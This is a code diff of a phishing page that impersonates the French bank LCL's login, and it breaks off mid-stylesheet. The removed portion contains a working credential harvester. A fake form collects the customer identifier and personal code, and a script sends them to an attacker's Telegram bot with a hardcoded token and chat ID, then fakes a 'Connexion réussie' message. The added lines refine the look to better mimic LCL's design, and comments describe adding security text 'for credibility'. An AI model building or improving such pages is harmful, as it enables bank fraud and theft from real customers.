@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mon Espace LCL - Connexion</title>
-    <!-- Police systeme pour imiter iOS -->
+    <title>Mon Espace LCL</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -16,9 +15,9 @@
             align-items: center;
             min-height: 100vh;
             color: #333;
+            position: relative;
         }
 
-        /* Conteneur principal pour centrer le contenu comme sur l'image */
         .container {
             width: 100%;
             max-width: 400px;
@@ -29,198 +28,114 @@
             align-items: center;
         }
 
-        /* LOGO */
         .logo-container {
-            margin-top: 40px;
+            margin-top: 30px;
             margin-bottom: 30px;
         }
         .logo-container img {
-            width: 120px; /* Taille moyenne comme demandé */
+            width: 110px;
             height: auto;
-            display: block;
         }
 
-        /* TITRE */
         h1 {
-            font-size: 20px;
+            font-size: 22px;
             font-weight: 600;
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             color: #000;
-            line-height: 1.4;
         }
 
-        /* FORMULAIRE */
-        .form-group {
+        /* STYLE FLAT LCL : Pas de bordure complète, juste une ligne en bas */
+        .input-wrapper {
             width: 100%;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            position: relative;
         }
 
         label {
             display: block;
             font-size: 14px;
-            color: #333;
+            color: #666;
             margin-bottom: 8px;
             font-weight: 500;
         }
 
         input {
             width: 100%;
-            padding: 14px 12px;
-            font-size: 16px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
+            padding: 12px 0; /* Padding vertical réduit pour le style flat */
+            font-size: 18px;
+            border: none;
+            border-bottom: 1px solid #CCC; /* La seule ligne */
             background-color: #fff;
-            box-sizing: border-box;
             outline: none;
+            border-radius: 0;
             transition: border-color 0.2s;
         }
 
         input:focus {
-            border-color: #0056B2; /* Bleu LCL approximatif */
+            border-bottom: 2px solid #0056B2; /* Devient bleu LCL au focus */
         }
 
-        /* BOUTON VALIDER */
         .btn-submit {
             width: 100%;
-            background-color: #0056B2; /* Bleu LCL */
+            background-color: #0056B2;
             color: white;
             border: none;
-            padding: 15px;
-            font-size: 16px;
+            padding: 16px;
+            font-size: 17px;
             font-weight: 600;
-            border-radius: 4px; /* Coins légèrement arrondis comme sur iOS */
+            border-radius: 6px;
             cursor: pointer;
             margin-top: 10px;
-            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
         .btn-submit:active {
             background-color: #00408A;
         }
 
-        /* LIENS EN BAS */
-        .links-container {
+        /* Masquer les étapes non actives */
+        .step {
+            display: none;
             width: 100%;
-            margin-top: 15px;
+            animation: fadeIn 0.4s ease;
+        }
+        .step.active {
             display: flex;
             flex-direction: column;
-            gap: 12px;
-            align-items: flex-start; /* Aligné à gauche comme sur la capture */
+            align-items: center;
         }
 
-        a {
-            color: #0056B2;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .signup {
-            color: #0056B2;
-            font-weight: 600;
-            text-decoration: none;
-            font-size: 14px;
+        .links {
             margin-top: 20px;
+            text-align: center;
+        }
+        .links a {
+            color: #0056B2;
+            text-decoration: none;
+            font-size: 14px;
             display: block;
+            margin-bottom: 10px;
         }
 
-        /* BARRE DE NAVIGATION DU BOT (Optionnel si tu veux cacher l'URL) */
-        /* Note: Si c'est une webview, on peut cacher la barre de titre */
-        
-        /* MESSAGE DE SECURITE (Similaire à la 2ème image) */
         .security-note {
             font-size: 12px;
-            color: #666;
-            margin-top: 30px;
-            text-align: left;
-            padding: 0 10px;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
-            width: 100%;
+            color: #888;
+            margin-top: 40px;
+            text-align: center;
+            padding: 0 20px;
+            line-height: 1.5;
         }
-    </style>
-</head>
-<body>
 
-<div class="container">
-    
-    <!-- LOGO LCL -->
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20210313135726" alt="Logo LCL">
-    </div>
-
-    <h1>Votre identifiant</h1>
-
-    <form id="loginForm">
-        <div class="form-group">
-            <label for="username">Identifiant</label>
-            <input type="text" id="username" name="username" placeholder="Ex: 123456789" required>
-        </div>
-
-        <div class="form-group">
-            <label for="code">Code personnel</label>
-            <!-- inputmode=numeric force le clavier numérique sur iPhone -->
-            <input type="password" id="code" name="code" placeholder="6 chiffres" inputmode="numeric" pattern="\d{6}" maxlength="6" required>
-        </div>
-
-        <button type="submit" class="btn-submit">Valider</button>
-
-        <div class="links-container">
-            <a href="#">Identifiant oublié ?</a>
-            <a href="#">Code personnel oublié ?</a>
-        </div>
-
-        <a href="#" class="signup">Pas encore client ? Ouvrir un compte &gt;</a>
-    </form>
-
-    <!-- Petit texte de sécurité pour crédibilité -->
-    <div class="security-note">
-        LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.
-    </div>
-
-</div>
-
-<script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        const username = document.getElementById('username').value;
-        const code = document.getElementById('code').value;
-
-        // Message pour Telegram
-        const message = `🔐 *Connexion LCL Détectée*\n\n` +
-                        `👤 Identifiant: ${username}\n` +
-                        `🔑 Code Perso: ${code}\n` +
-                        `📱 Device: iOS (iPhone)\n` +
-                        `🕒 Heure: ${new Date().toLocaleTimeString()}`;
-
-        // Remplacer par tes vrais tokens
-        const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ/getUpdates'; 
-        const chatId = '8501464548';
-        
-        // Envoi à Telegram
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        }).then(() => {
-            // Feedback visuel "Succès"
-            document.querySelector('.btn-submit').innerText = "Connexion réussie...";
-            document.querySelector('.btn-submit').style.backgroundColor = "#28a745";
-            
-            setTimeout(() => {
-                alert("Bienvenue sur Mon Espace LCL.");
-                // Optionnel : rediriger vers le vrai site
-                // window.location.href = "https://monespace.lcl.fr";
-            }, 1000);
-        }).catch(err => console.error(err));
-    });
-</script>
-
-</body>
-</html>
+        /* Loader */
+        .loader-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh
